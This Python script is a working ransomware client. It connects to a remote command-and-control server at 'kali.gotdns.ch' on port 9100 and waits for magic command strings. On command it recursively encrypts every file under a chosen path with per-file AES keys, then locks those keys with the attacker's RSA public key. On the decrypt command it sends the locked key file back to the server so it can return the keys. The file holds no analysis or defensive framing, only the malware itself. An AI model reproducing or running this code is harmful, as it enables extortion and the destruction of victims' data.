#!/usr/bin/python3

import socket
import time
import os.path

from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

#import py7zr
import multivolumefile
import pathlib
import binascii
import hashlib
import shutil
import json
import os
import gzip
import io




class Client_AES_Encrypt_File:
    def __init__(self, path, pub_key):
        self.path = path
        self.pub_key = pub_key
        self.file_aes_map = {}

    def export_pub_key(self):
        with open("public_key.pem", "wb") as file:
            file.write(self.pub_key)

        with open("public_key.pem", "rb") as file:
            key = RSA.importKey(file.read())

        self.pub_key = key
        os.remove("public_key.pem")

    def aes_key_store(self, store_type):

        if store_type == 1:
            if os.path.exists("keys/"):
                shutil.rmtree("keys/")
            os.mkdir('keys')

            with open("keys/aes_keys", "w") as aes_keys:
                json.dump(self.file_aes_map, aes_keys, indent=4)
                # json.dump(self.file_aes_map, aes_keys)

            target = pathlib.Path('keys/aes_keys')

            # either use gzip for both server and client or just use py7zr

            # with multivolumefile.open('keys/aes_keys_archive', mode='wb', volume=450) as target_archive:
            #     with py7zr.SevenZipFile(target_archive, 'w') as archive:
            #         archive.writeall(target, 'aes_keys')

            with multivolumefile.open('keys/aes_keys_archive', mode='wb', volume=450) as target_archive:
                with gzip.open(target_archive, 'wb') as archive:
                    with io.TextIOWrapper(archive, encoding='utf-8') as encode:
                        data = open(target, "r").read()
                        encode.write(data)


            os.remove("keys/aes_keys")

        else:
            # either use shutil.make_archive("key", 'zip', "keys") & os.rename("key.zip", "key") for client or just use py7zr

            # with py7zr.SevenZipFile('key', 'w') as archive:
            #     archive.writeall("keys/")

            shutil.make_archive("key", 'zip', "keys")
            os.rename("key.zip", "key")

            shutil.rmtree("keys/")

    def encrypt_with_aes(self, file_path, key, IV):
        try:
            mode = AES.MODE_CBC
            cipher = AES.new(key, mode, IV)

            file = open(file_path, "rb")
            data = file.read()
            file.close()

            while len(data) % 16 != 0:
                data += b'0'

            encrypted_msg = cipher.encrypt(data)

            file = open(file_path, "wb")
            file.write(encrypted_msg)
            file.close()

            return True

        except Exception as error:
            print(error)

            return False

    def aes_generator(self):

        password = get_random_bytes(256)
        key = hashlib.sha256(password).digest()
        IV = get_random_bytes(16)

        # return key, hex_to_str(key), IV, hex_to_str(IV)
        return key, binascii.hexlify(key).decode("utf-8"), IV, binascii.hexlify(IV).decode("utf-8")

    def aes_run_encrypt(self):
        for file_path in self.file_aes_map:
            key, str_key, IV, str_IV = self.aes_generator()

            state = self.encrypt_with_aes(file_path, key, IV)
            if state:
                self.file_aes_map[file_path] = [str_key, str_IV]

    def directory_looper(self, path):
        path_d = []

        for directory in os.walk(path):
            path_d.append(directory)

        if len(path_d) == 0:
            self.file_aes_map[path_d] = None

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files
                    self.file_aes_map[file_path] = None

    def encrypt_with_rsa(self, file_path):

        file = open(file_path, "rb")
        data = file.read()
        file.close()

        encryptor = PKCS1_OAEP.new(self.pub_key)
        encrypted = encryptor.encrypt(data)

        file = open(file_path, "wb")
        file.write(encrypted)
        file.close()

    def rsa_run_encrypt(self):
        self.file_aes_map = {}
        self.directory_looper("keys/")

        for file in self.file_aes_map:
            self.encrypt_with_rsa(file)

    def main(self):
        self.export_pub_key()
        self.directory_looper(self.path)
        print("[+] Encrypting Files")
        self.aes_run_encrypt()
        self.aes_key_store(1)
        print("[+] Encrypting AES Symmetric Keys")
        self.rsa_run_encrypt()
        self.aes_key_store(2)
        print("[+] Completed!!")


class Client_AES_Decrypt_File:

    def decrypt_with_aes(self, file_path, key, IV):
        try:
            mode = AES.MODE_CBC
            cipher = AES.new(key, mode, IV)

            file = open(file_path, "rb")
            data = file.read()
            file.close()

            decrypted_msg = cipher.decrypt(data)
            final_data = decrypted_msg.rstrip(b'0')

            file = open(file_path, "wb")
            file.write(final_data)
            file.close()

        except Exception as error:
            print(error)

            return False

    def aes_run_encrypt(self):

        def str_to_hex(key):
            new_key = b""
            for x in range(0, len(key), 4):
                x = int(key[x:x + 4], base=16)
                new_key += bytes([x >> 8, x & 0xFF])

            return new_key

        file_keys = json.load(open('aes_keys'))

        for file_path in file_keys:
            aes_key = str_to_hex(file_keys[file_path][0])
            IV = str_to_hex(file_keys[file_path][-1])

            self.decrypt_with_aes(file_path, aes_key, IV)

    def main(self):
        print("[+] Decrypting Files")
        self.aes_run_encrypt()
        print("[+] Decryption Complete!!\n\nThank you for your Service. Stay Safe!!")

        os.remove("aes_keys")
        os.remove("key")


s = None
type_data = None


def decider(data):
    global type_data

    # Use to check file/directory if exists
    if data == "D@nC1nGM0nK3yPATHdjShankeyShoe" or type_data == "file":
        if type_data == "file":
            result = os.path.exists(data)
            if result:
                output = b"Exists"
            else:
                output = b"Error"
            type_data = None
            return output
        else:
            type_data = "file"
            return None

    # Encryption
    elif data == "B!GP0ndENCRYPTsmallFishZY" or type_data == "public_key":
        if type_data == "public_key":

            # Split the key and the path
            key = data.split("@@Encrypt@@")[0].encode("utf-8")
            path = data.split("@@Encrypt@@")[-1]

            # Encrypts the data
            Client_AES_Encrypt_File(path, key).main()
            type_data = None

        else:
            type_data = "public_key"
            return None

    elif data == "y3sD@DDyDECRYPTBigPaPaYJ" or type_data == "private_key":
        file = open("key", "rb")
        filesend = file.read()
        file.close()


        s.send(filesend)

        time.sleep(0.5)
        s.send(b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN')

        data = b''
        while True:
            reply = s.recv(9999)

            if reply == b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN':
                break
            else:
                data += reply

        file = open('aes_keys', 'wb')
        file.write(data)
        file.close()

        Client_AES_Decrypt_File().main()


def socketing():
    global s
    port = 9100
    ip = "kali.gotdns.ch"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    error = True
    while error:
        try:
            s.connect((ip, port))
            error = False
        except:
            time.sleep(3)

    while True:
        type = s.recv(9999)
        type = type.decode("utf-8")
        output = decider(type)

        # Send back the output message
        if output != None:
            s.send(output)

        if type == b'End':
            s.close()
            exit()

    # s.close()


socketing()
